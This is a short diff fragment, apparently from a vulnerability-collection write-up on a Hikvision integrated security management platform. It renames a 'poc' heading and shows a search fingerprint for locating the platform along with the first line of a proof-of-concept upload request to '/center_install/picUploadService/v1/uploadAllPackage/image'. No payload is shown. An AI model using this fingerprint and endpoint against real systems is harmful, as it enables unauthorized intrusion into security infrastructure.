@@ -8,7 +8,7 @@
 app="HIKVISION-综合安防管理平台"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
